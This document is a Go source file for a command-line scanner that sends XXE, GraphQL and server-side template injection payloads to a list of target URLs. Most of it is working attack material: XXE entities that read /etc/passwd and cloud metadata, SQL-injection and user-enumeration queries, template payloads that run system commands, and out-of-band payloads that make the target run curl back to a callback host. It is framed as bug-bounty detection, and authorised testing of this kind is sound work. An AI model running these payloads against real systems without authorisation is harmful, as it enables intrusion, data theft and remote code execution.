package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

// ─── Colors ───────────────────────────────────────────────────────────────────
const (
	RED    = "\033[31m"
	GREEN  = "\033[32m"
	YELLOW = "\033[33m"
	CYAN   = "\033[36m"
	BOLD   = "\033[1m"
	RESET  = "\033[0m"
	DIM    = "\033[2m"
)

// ─── Result ───────────────────────────────────────────────────────────────────
type Finding struct {
	URL       string
	Vuln      string
	Type      string
	Payload   string
	Evidence  string
	Severity  string
	Timestamp time.Time
}

var (
	findings []Finding
	mu       sync.Mutex
	client   *http.Client
)

// ─── OOB Callback Server ──────────────────────────────────────────────────────
var oobCallbacks = struct {
	sync.Mutex
	hits map[string]string
}{hits: make(map[string]string)}

func startOOBServer(port string) {
	http.HandleFunc("/oob/", func(w http.ResponseWriter, r *http.Request) {
		id := strings.TrimPrefix(r.URL.Path, "/oob/")
		oobCallbacks.Lock()
		oobCallbacks.hits[id] = r.RemoteAddr
		oobCallbacks.Unlock()
		fmt.Fprintf(w, "OK")
		logFound("OOB", "Callback received", id, r.RemoteAddr, "CRITICAL")
	})
	go http.ListenAndServe(":"+port, nil)
	logInfo(fmt.Sprintf("OOB callback server listening on :%s", port))
}

func checkOOB(id string) (bool, string) {
	time.Sleep(3 * time.Second)
	oobCallbacks.Lock()
	defer oobCallbacks.Unlock()
	if addr, ok := oobCallbacks.hits[id]; ok {
		return true, addr
	}
	return false, ""
}

// ─── Logging ──────────────────────────────────────────────────────────────────
func logInfo(msg string) {
	fmt.Printf("%s[*]%s %s\n", CYAN, RESET, msg)
}

func logWarn(msg string) {
	fmt.Printf("%s[!]%s %s\n", YELLOW, RESET, msg)
}

func logFound(vuln, typ, payload, evidence, severity string) {
	icon := "🔴"
	color := RED
	if severity == "MEDIUM" {
		icon = "🟡"
		color = YELLOW
	} else if severity == "LOW" {
		icon = "🟢"
		color = GREEN
	}
	fmt.Printf("\n%s%s [%s%s%s] %s%s\n", color, icon, BOLD, vuln, RESET+color, typ, RESET)
	fmt.Printf("  %s Payload:%s  %s\n", DIM, RESET, payload)
	fmt.Printf("  %s Evidence:%s %s\n\n", DIM, RESET, evidence)
}

func addFinding(target, vuln, typ, payload, evidence, severity string) {
	mu.Lock()
	defer mu.Unlock()
	findings = append(findings, Finding{
		URL: target, Vuln: vuln, Type: typ,
		Payload: payload, Evidence: evidence,
		Severity: severity, Timestamp: time.Now(),
	})
	logFound(vuln, typ, payload, evidence, severity)
}

// ─── HTTP Helper ──────────────────────────────────────────────────────────────
func doRequest(method, targetURL, contentType, body string, headers map[string]string) (*http.Response, string, error) {
	var reqBody io.Reader
	if body != "" {
		reqBody = strings.NewReader(body)
	}
	req, err := http.NewRequest(method, targetURL, reqBody)
	if err != nil {
		return nil, "", err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (BugBountyScanner/1.0)")
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()
	respBytes, _ := io.ReadAll(resp.Body)
	return resp, string(respBytes), nil
}

// ═══════════════════════════════════════════════════════════════════════════════
// XXE SCANNER
// ═══════════════════════════════════════════════════════════════════════════════

var xxePayloads = map[string]string{
	// In-band classic
	"inband_etc_passwd": `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`,

	// In-band Windows
	"inband_win_system": `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
<root><data>&xxe;</data></root>`,

	// Error-based
	"error_based": `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%xxe;'>">
  %eval;
  %exfil;
]>
<root/>`,

	// SSRF via XXE
	"ssrf_internal": `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>`,

	// PHP filter wrapper
	"php_filter": `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>`,

	// Billion laughs (DoS detection - safe version)
	"entity_expansion": `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;">
]>
<root>&lol3;</root>`,
}

var xxeErrorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`root:.*:0:0:`),
	regexp.MustCompile(`\[boot loader\]`),
	regexp.MustCompile(`daemon:.*:/usr/sbin`),
	regexp.MustCompile(`no such file or directory`),
	regexp.MustCompile(`failed to load external entity`),
	regexp.MustCompile(`ami-id`),
	regexp.MustCompile(`instance-id`),
	regexp.MustCompile(`<?php`),
	regexp.MustCompile(`base64`),
}

func scanXXE(target string, oobHost string, wg *sync.WaitGroup) {
	defer wg.Done()
	fmt.Printf("%s[XXE]%s Testing %s\n", CYAN, RESET, target)

	// In-band payloads
	for name, payload := range xxePayloads {
		_, body, err := doRequest("POST", target, "application/xml", payload, nil)
		if err != nil {
			continue
		}
		for _, pattern := range xxeErrorPatterns {
			if pattern.MatchString(body) {
				addFinding(target, "XXE", "In-band/Error-based",
					name, fmt.Sprintf("Pattern matched: %s", pattern.String()), "CRITICAL")
				break
			}
		}
		// Also try multipart/form-data with XML
		_, body2, err2 := doRequest("POST", target, "text/xml", payload, nil)
		if err2 == nil {
			for _, pattern := range xxeErrorPatterns {
				if pattern.MatchString(body2) {
					addFinding(target, "XXE", "In-band (text/xml)",
						name, fmt.Sprintf("Pattern matched: %s", pattern.String()), "CRITICAL")
					break
				}
			}
		}
	}

	// OOB payloads (if oobHost provided)
	if oobHost != "" {
		oobID := fmt.Sprintf("xxe-%d", rand.Intn(99999))
		oobPayload := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://%s/oob/%s">]>
<root><data>&xxe;</data></root>`, oobHost, oobID)

		doRequest("POST", target, "application/xml", oobPayload, nil)

		if hit, addr := checkOOB(oobID); hit {
			addFinding(target, "XXE", "Out-of-Band", oobPayload,
				fmt.Sprintf("OOB callback from %s", addr), "CRITICAL")
		}

		// OOB parameter entity
		oobID2 := fmt.Sprintf("xxe-param-%d", rand.Intn(99999))
		oobDTD := fmt.Sprintf(`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY %% remote SYSTEM "http://%s/oob/%s">
  %%remote;
]>
<root/>`, oobHost, oobID2)
		doRequest("POST", target, "application/xml", oobDTD, nil)
		if hit, addr := checkOOB(oobID2); hit {
			addFinding(target, "XXE", "OOB Parameter Entity", oobDTD,
				fmt.Sprintf("Callback from %s", addr), "CRITICAL")
		}
	}

	// Blind time-based (response time diff)
	start := time.Now()
	slowPayload := `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://10.255.255.1/">]>
<root><data>&xxe;</data></root>`
	doRequest("POST", target, "application/xml", slowPayload, nil)
	elapsed := time.Since(start)
	if elapsed > 8*time.Second {
		addFinding(target, "XXE", "Blind Time-based",
			slowPayload, fmt.Sprintf("Response delayed %v (SSRF via XXE likely)", elapsed), "HIGH")
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// GRAPHQL SCANNER
// ═══════════════════════════════════════════════════════════════════════════════

var graphqlEndpoints = []string{
	"/graphql", "/api/graphql", "/graphql/v1", "/v1/graphql",
	"/graph", "/gql", "/query", "/api/query",
	"/graphql/console", "/graphiql", "/playground",
}

var graphqlIntrospection = `{
  "query": "{ __schema { types { name fields { name } } } }"
}`

var graphqlSSTIPayloads = []string{
	`{ "query": "{ __typename @skip(if: false) }" }`,
	`{ "query": "query { systemInfo { version os } }" }`,
}

var graphqlBatchPayload = `[
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"}
]`

var graphqlIDOR = `{
  "query": "{ user(id: %d) { id email username role } }"
}`

var graphqlSQLi = []string{
	`{ "query": "{ user(id: \"1 OR 1=1\") { email } }" }`,
	`{ "query": "{ search(term: \"' OR '1'='1\") { results } }" }`,
	`{ "query": "{ login(user: \"admin'--\", pass: \"x\") { token } }" }`,
}

var graphqlErrorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`"__schema"`),
	regexp.MustCompile(`"types"`),
	regexp.MustCompile(`introspection`),
	regexp.MustCompile(`syntax error`),
	regexp.MustCompile(`unexpected token`),
	regexp.MustCompile(`Cannot query field`),
	regexp.MustCompile(`sql`),
	regexp.MustCompile(`ORA-\d+`),
	regexp.MustCompile(`pg_query`),
}

func discoverGraphQL(baseURL string) string {
	parsed, err := url.Parse(baseURL)
	if err != nil {
		return ""
	}
	base := fmt.Sprintf("%s://%s", parsed.Scheme, parsed.Host)
	for _, ep := range graphqlEndpoints {
		testURL := base + ep
		_, body, err := doRequest("POST", testURL, "application/json",
			`{"query":"{__typename}"}`, nil)
		if err != nil {
			continue
		}
		if strings.Contains(body, `"data"`) || strings.Contains(body, `"errors"`) {
			logInfo(fmt.Sprintf("GraphQL endpoint found: %s", testURL))
			return testURL
		}
		// GET introspection
		getURL := testURL + "?query={__typename}"
		_, body2, err2 := doRequest("GET", getURL, "", "", nil)
		if err2 == nil && (strings.Contains(body2, `"data"`) || strings.Contains(body2, `"errors"`)) {
			logInfo(fmt.Sprintf("GraphQL endpoint found (GET): %s", testURL))
			return testURL
		}
	}
	return ""
}

func scanGraphQL(target string, oobHost string, wg *sync.WaitGroup) {
	defer wg.Done()
	fmt.Printf("%s[GQL]%s Testing %s\n", CYAN, RESET, target)

	// Auto-discover endpoint
	endpoint := target
	if !strings.Contains(target, "graphql") && !strings.Contains(target, "gql") {
		if found := discoverGraphQL(target); found != "" {
			endpoint = found
		} else {
			logWarn(fmt.Sprintf("No GraphQL endpoint found at %s", target))
			return
		}
	}

	// 1. Introspection enabled
	_, body, err := doRequest("POST", endpoint, "application/json", graphqlIntrospection, nil)
	if err == nil && strings.Contains(body, `"__schema"`) {
		addFinding(endpoint, "GraphQL", "Introspection Enabled",
			graphqlIntrospection, "Full schema dump returned", "MEDIUM")

		// Parse and display types found
		var result map[string]interface{}
		if json.Unmarshal([]byte(body), &result) == nil {
			addFinding(endpoint, "GraphQL", "Schema Disclosure",
				"introspection", fmt.Sprintf("Response length: %d bytes", len(body)), "MEDIUM")
		}
	}

	// 2. Introspection via GET
	_, body2, _ := doRequest("GET", endpoint+"?query={__schema{types{name}}}", "", "", nil)
	if strings.Contains(body2, `"__schema"`) {
		addFinding(endpoint, "GraphQL", "Introspection via GET",
			"GET ?query={__schema{types{name}}}", "Schema exposed via GET", "MEDIUM")
	}

	// 3. Batch query attack
	_, body3, _ := doRequest("POST", endpoint, "application/json", graphqlBatchPayload, nil)
	if strings.Contains(body3, `"data"`) && strings.Count(body3, `"__typename"`) > 2 {
		addFinding(endpoint, "GraphQL", "Batch Query Attack",
			graphqlBatchPayload, "Server processes batch queries (DoS/rate-limit bypass risk)", "MEDIUM")
	}

	// 4. SQLi via GraphQL
	for _, payload := range graphqlSQLi {
		_, body4, err := doRequest("POST", endpoint, "application/json", payload, nil)
		if err != nil {
			continue
		}
		sqliPatterns := []*regexp.Regexp{
			regexp.MustCompile(`(?i)(sql|syntax|mysql|postgres|sqlite|ora-\d+|pg_)`),
			regexp.MustCompile(`(?i)(warning.*mysql|supplied argument|unclosed quotation)`),
		}
		for _, p := range sqliPatterns {
			if p.MatchString(body4) {
				addFinding(endpoint, "GraphQL", "SQL Injection via GraphQL",
					payload, fmt.Sprintf("DB error: %s", p.String()), "CRITICAL")
			}
		}
	}

	// 5. IDOR via GraphQL (enumerate IDs 1-5)
	for i := 1; i <= 5; i++ {
		payload := fmt.Sprintf(graphqlIDOR, i)
		_, body5, err := doRequest("POST", endpoint, "application/json", payload, nil)
		if err != nil {
			continue
		}
		if strings.Contains(body5, `"email"`) || strings.Contains(body5, `"username"`) {
			addFinding(endpoint, "GraphQL", "IDOR - User Enumeration",
				fmt.Sprintf("user(id: %d)", i), fmt.Sprintf("User data returned for id=%d", i), "HIGH")
		}
	}

	// 6. Field suggestion / debug mode
	_, body6, _ := doRequest("POST", endpoint, "application/json",
		`{"query":"{ nonExistentField }"}`, nil)
	if strings.Contains(body6, "Did you mean") || strings.Contains(body6, "suggestion") {
		addFinding(endpoint, "GraphQL", "Field Suggestion Enabled",
			`{"query":"{ nonExistentField }"}`,
			"Server reveals valid field names via suggestions", "LOW")
	}

	// 7. OOB via GraphQL SSRF
	if oobHost != "" {
		oobID := fmt.Sprintf("gql-%d", rand.Intn(99999))
		ssrfPayload := fmt.Sprintf(`{"query":"{ importURL(url: \"http://%s/oob/%s\") { data } }"}`, oobHost, oobID)
		doRequest("POST", endpoint, "application/json", ssrfPayload, nil)
		if hit, addr := checkOOB(oobID); hit {
			addFinding(endpoint, "GraphQL", "SSRF via GraphQL OOB",
				ssrfPayload, fmt.Sprintf("Callback from %s", addr), "CRITICAL")
		}
	}

	// 8. Alias overloading (DoS)
	var aliasBuf strings.Builder
	aliasBuf.WriteString(`{"query":"{ `)
	for i := 0; i < 100; i++ {
		aliasBuf.WriteString(fmt.Sprintf("a%d: __typename ", i))
	}
	aliasBuf.WriteString(`}"}`)
	start := time.Now()
	doRequest("POST", endpoint, "application/json", aliasBuf.String(), nil)
	if time.Since(start) > 5*time.Second {
		addFinding(endpoint, "GraphQL", "Alias Overloading (DoS)",
			"100x alias query", fmt.Sprintf("Response time: %v", time.Since(start)), "MEDIUM")
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// SSTI SCANNER
// ═══════════════════════════════════════════════════════════════════════════════

type SSTIPayload struct {
	Payload  string
	Expected *regexp.Regexp
	Engine   string
}

var sstiPayloads = []SSTIPayload{
	// Jinja2 / Twig
	{`{{7*7}}`, regexp.MustCompile(`49`), "Jinja2/Twig"},
	{`{{7*'7'}}`, regexp.MustCompile(`7777777`), "Jinja2"},
	{`{{'7'*7}}`, regexp.MustCompile(`7777777`), "Jinja2"},
	// Twig specific
	{`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`, regexp.MustCompile(`uid=`), "Twig RCE"},
	// Freemarker
	{`${7*7}`, regexp.MustCompile(`49`), "Freemarker/EL"},
	{`#{7*7}`, regexp.MustCompile(`49`), "Freemarker"},
	// Smarty
	{`{7*7}`, regexp.MustCompile(`49`), "Smarty"},
	{`{php}echo 7*7;{/php}`, regexp.MustCompile(`49`), "Smarty PHP"},
	// Velocity
	{`#set($x=7*7)${x}`, regexp.MustCompile(`49`), "Velocity"},
	// ERB / Ruby
	{`<%= 7*7 %>`, regexp.MustCompile(`49`), "ERB"},
	{`<%= system("id") %>`, regexp.MustCompile(`uid=`), "ERB RCE"},
	// Mako
	{`${7*7}`, regexp.MustCompile(`49`), "Mako"},
	// Go template
	{`{{.}}`, nil, "Go template"},
	// Tornado
	{`{% import os %}{{os.popen("id").read()}}`, regexp.MustCompile(`uid=`), "Tornado RCE"},
	// Handlebars
	{`{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return process.env;"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}`, regexp.MustCompile(`PATH=`), "Handlebars SSTI"},
	// OGNL (Struts)
	{`%{7*7}`, regexp.MustCompile(`49`), "OGNL/Struts"},
	{`${7*7}`, regexp.MustCompile(`49`), "EL Injection"},
}

var sstiBlindPayloads = []struct {
	Payload string
	Engine  string
	Delay   time.Duration
}{
	{`{{range.constructor("return global.process.mainModule.require('child_process').execSync('sleep 5').toString()")()}}`, "Node.js", 5 * time.Second},
	{`{% import time %}${time.sleep(5)}`, "Python", 5 * time.Second},
	{`#set($x="")#foreach($i in [1..9999999])$x=$x+$i#end`, "Velocity DoS", 5 * time.Second},
}

func getParams(targetURL string) []string {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return nil
	}
	var params []string
	for k := range parsed.Query() {
		params = append(params, k)
	}
	return params
}

func injectSSTI(targetURL, param, payload string) string {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return ""
	}
	q := parsed.Query()
	q.Set(param, payload)
	parsed.RawQuery = q.Encode()
	_, body, err := doRequest("GET", parsed.String(), "", "", nil)
	if err != nil {
		return ""
	}
	return body
}

func scanSSTI(target string, oobHost string, wg *sync.WaitGroup) {
	defer wg.Done()
	fmt.Printf("%s[SSTI]%s Testing %s\n", CYAN, RESET, target)

	params := getParams(target)
	if len(params) == 0 {
		// Try common params
		params = []string{"name", "q", "search", "query", "template", "view", "page", "lang", "msg", "data", "input", "text", "content"}
	}

	for _, param := range params {
		// In-band detection
		for _, p := range sstiPayloads {
			body := injectSSTI(target, param, p.Payload)
			if body == "" {
				continue
			}
			if p.Expected != nil && p.Expected.MatchString(body) {
				sev := "HIGH"
				if strings.Contains(p.Engine, "RCE") {
					sev = "CRITICAL"
				}
				addFinding(target, "SSTI", fmt.Sprintf("In-band (%s)", p.Engine),
					fmt.Sprintf("%s=%s", param, p.Payload),
					fmt.Sprintf("Expected pattern '%s' found in response", p.Expected.String()), sev)
			}
		}

		// POST body injection
		for _, p := range sstiPayloads {
			postBody := fmt.Sprintf("%s=%s", param, url.QueryEscape(p.Payload))
			_, body, err := doRequest("POST", target, "application/x-www-form-urlencoded", postBody, nil)
			if err != nil {
				continue
			}
			if p.Expected != nil && p.Expected.MatchString(body) {
				addFinding(target, "SSTI", fmt.Sprintf("In-band POST (%s)", p.Engine),
					fmt.Sprintf("POST %s=%s", param, p.Payload),
					"Expression evaluated in response", "CRITICAL")
			}
		}

		// JSON body injection
		for _, p := range sstiPayloads {
			jsonBody := fmt.Sprintf(`{"%s": "%s"}`, param, strings.ReplaceAll(p.Payload, `"`, `\"`))
			_, body, err := doRequest("POST", target, "application/json", jsonBody, nil)
			if err != nil {
				continue
			}
			if p.Expected != nil && p.Expected.MatchString(body) {
				addFinding(target, "SSTI", fmt.Sprintf("In-band JSON (%s)", p.Engine),
					fmt.Sprintf("JSON %s=%s", param, p.Payload),
					"Expression evaluated via JSON body", "CRITICAL")
			}
		}

		// Blind time-based
		for _, bp := range sstiBlindPayloads {
			start := time.Now()
			injectSSTI(target, param, bp.Payload)
			elapsed := time.Since(start)
			if elapsed >= bp.Delay {
				addFinding(target, "SSTI", fmt.Sprintf("Blind Time-based (%s)", bp.Engine),
					fmt.Sprintf("%s=%s", param, bp.Payload),
					fmt.Sprintf("Response delayed %v", elapsed), "HIGH")
			}
		}

		// OOB SSTI
		if oobHost != "" {
			oobID := fmt.Sprintf("ssti-%d", rand.Intn(99999))
			oobPayloads := []string{
				fmt.Sprintf(`{{config.__class__.__init__.__globals__['os'].popen('curl http://%s/oob/%s').read()}}`, oobHost, oobID),
				fmt.Sprintf("<%%=`curl http://%s/oob/%s`%%>", oobHost, oobID),
				fmt.Sprintf(`${T(java.lang.Runtime).getRuntime().exec('curl http://%s/oob/%s')}`, oobHost, oobID),
			}
			for _, op := range oobPayloads {
				injectSSTI(target, param, op)
			}
			if hit, addr := checkOOB(oobID); hit {
				addFinding(target, "SSTI", "OOB/RCE via SSTI",
					fmt.Sprintf("%s=<oob_payload>", param),
					fmt.Sprintf("OOB callback from %s", addr), "CRITICAL")
			}
		}
	}

	// Header injection
	sstiHeaders := map[string]string{
		"User-Agent":    `{{7*7}}`,
		"Referer":       `${7*7}`,
		"X-Forwarded-For": `#{7*7}`,
	}
	for header, payload := range sstiHeaders {
		_, body, err := doRequest("GET", target, "", "", map[string]string{header: payload})
		if err != nil {
			continue
		}
		if strings.Contains(body, "49") {
			addFinding(target, "SSTI", fmt.Sprintf("Header Injection (%s)", header),
				fmt.Sprintf("%s: %s", header, payload), "Expression '49' found in response", "HIGH")
		}
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// REPORT
// ═══════════════════════════════════════════════════════════════════════════════

func generateReport(outputFile string) {
	mu.Lock()
	defer mu.Unlock()

	if len(findings) == 0 {
		fmt.Printf("\n%s[✓] No vulnerabilities found.%s\n", GREEN, RESET)
		return
	}

	fmt.Printf("\n%s%s═══════════════════════ SCAN REPORT ═══════════════════════%s\n", BOLD, CYAN, RESET)
	fmt.Printf("  Total findings: %s%d%s\n\n", RED, len(findings), RESET)

	critCount, highCount, medCount, lowCount := 0, 0, 0, 0
	for _, f := range findings {
		switch f.Severity {
		case "CRITICAL":
			critCount++
		case "HIGH":
			highCount++
		case "MEDIUM":
			medCount++
		case "LOW":
			lowCount++
		}
	}

	fmt.Printf("  🔴 CRITICAL: %d\n  🟠 HIGH:     %d\n  🟡 MEDIUM:   %d\n  🟢 LOW:      %d\n\n", critCount, highCount, medCount, lowCount)

	for i, f := range findings {
		fmt.Printf("%s[%d]%s %s | %s%s%s | %s\n", DIM, i+1, RESET, f.Vuln, BOLD, f.Type, RESET, f.URL)
	}

	if outputFile != "" {
		data, _ := json.MarshalIndent(findings, "", "  ")
		os.WriteFile(outputFile, data, 0644)
		fmt.Printf("\n%s[+] Report saved to %s%s\n", GREEN, outputFile, RESET)
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════════════════════════════════

func banner() {
	fmt.Printf(`%s
 ██████╗ ██╗  ██╗ ██████╗     ██╗  ██╗██╗  ██╗███████╗
██╔════╝ ╚██╗██╔╝██╔════╝     ╚██╗██╔╝╚██╗██╔╝██╔════╝
██║  ███╗ ╚███╔╝ ╚█████╗       ╚███╔╝  ╚███╔╝ █████╗  
██║   ██║ ██╔██╗  ╚═══██╗      ██╔██╗  ██╔██╗ ██╔══╝  
╚██████╔╝██╔╝ ██╗██████╔╝     ██╔╝ ██╗██╔╝ ██╗███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
%s  Deep Vuln Scanner: XXE + GraphQL + SSTI%s
  All detection: In-band | OOB | Blind | Time-based
%s`, CYAN, YELLOW, RESET, RESET)
}

func main() {
	banner()

	urlFile   := flag.String("urls", "", "File containing target URLs (one per line)")
	oobHost   := flag.String("oob", "", "OOB callback host (e.g. your.burpcollaborator.net or IP:port)")
	oobPort   := flag.String("oob-port", "8888", "Local OOB listener port (if using self-hosted)")
	workers   := flag.Int("workers", 5, "Concurrent workers")
	timeout   := flag.Int("timeout", 15, "HTTP timeout in seconds")
	output    := flag.String("o", "findings.json", "Output JSON report file")
	scanXXEF  := flag.Bool("xxe", true, "Enable XXE scanner")
	scanGQL   := flag.Bool("gql", true, "Enable GraphQL scanner")
	scanSSTIF := flag.Bool("ssti", true, "Enable SSTI scanner")
	selfOOB   := flag.Bool("self-oob", false, "Start local OOB server")
	flag.Parse()

	if *urlFile == "" {
		fmt.Printf("%s[!] Usage: %s -urls targets.txt [-oob yourhost.com] [-o report.json]%s\n", RED, os.Args[0], RESET)
		flag.PrintDefaults()
		os.Exit(1)
	}

	// HTTP client
	client = &http.Client{
		Timeout: time.Duration(*timeout) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// OOB server
	if *selfOOB {
		startOOBServer(*oobPort)
		if *oobHost == "" {
			*oobHost = fmt.Sprintf("127.0.0.1:%s", *oobPort)
		}
	}

	// Load URLs
	f, err := os.Open(*urlFile)
	if err != nil {
		fmt.Printf("%s[!] Cannot open URL file: %v%s\n", RED, err, RESET)
		os.Exit(1)
	}
	defer f.Close()

	var urls []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			urls = append(urls, line)
		}
	}

	logInfo(fmt.Sprintf("Loaded %d targets | Workers: %d | OOB: %s", len(urls), *workers, func() string {
		if *oobHost != "" {
			return *oobHost
		}
		return "disabled"
	}()))

	sem := make(chan struct{}, *workers)
	var wg sync.WaitGroup

	for _, target := range urls {
		target := target
		if *scanXXEF {
			sem <- struct{}{}
			wg.Add(1)
			go func() {
				defer func() { <-sem }()
				scanXXE(target, *oobHost, &wg)
			}()
		}
		if *scanGQL {
			sem <- struct{}{}
			wg.Add(1)
			go func() {
				defer func() { <-sem }()
				scanGraphQL(target, *oobHost, &wg)
			}()
		}
		if *scanSSTIF {
			sem <- struct{}{}
			wg.Add(1)
			go func() {
				defer func() { <-sem }()
				scanSSTI(target, *oobHost, &wg)
			}()
		}
	}

	// Buffer for any remaining
	var extraBytes bytes.Buffer
	_ = extraBytes

	wg.Wait()
	generateReport(*output)
}